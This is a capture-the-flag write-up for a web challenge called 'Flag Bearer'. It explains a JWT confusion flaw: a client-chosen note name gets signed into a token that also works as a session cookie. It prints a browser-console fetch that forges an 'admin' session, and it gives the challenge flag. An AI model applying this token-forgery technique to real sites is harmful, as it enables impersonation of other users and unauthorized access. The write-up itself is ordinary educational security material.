# Flag Bearer

> The admin knows the flag but won't tell me.
>
> https://flag-bearer.ecsc23.hack.cert.pl/

## Solution
The website allows the users to create the notes (each note has a random UUIDv4 as a name) and share them with others using a "note secret", which is a JWT token with a field `name` containing the note's name. Interestingly, `session` cookie is also a JWT with a field called `name`, this time holding user's nickname. After viewing the source of `/notes` subpage, interesting piece of JS code can be found:
```js
function uuidv4() {
  return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
    (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
  );
}

let noteForm = document.getElementById("addnote");
noteForm.addEventListener("submit", (e) => {
  e.preventDefault();

  let name = uuidv4()
  let content = document.getElementById("content").value;

  const r = fetch("/notes", {
    method: "POST",
    body: JSON.stringify({
      name: name,
      content: content,
    }),
    headers: {
      "Content-type": "application/json; charset=UTF-8"
    }
  }).then((data) => {
    location.reload();
  })
  
});
```
This means that the note's name can be arbitrarily chosen by the client and hence it's possible to forge a valid JWT token with `name` set to `admin` and then set it as `session` cookie and read admin's notes. This can be accomplished by running the following code from browser's JS console and then reading the new note's secret:
```js
fetch("/notes", {
    method: "POST",
    body: JSON.stringify({
      name: "admin",
      content: "pwned!",
    }),
    headers: {
      "Content-type": "application/json; charset=UTF-8"
    }
  }).then((data) => {
    location.reload();
  })
```

## Flag
`ecsc23{eyyyyyyyyyylmao}`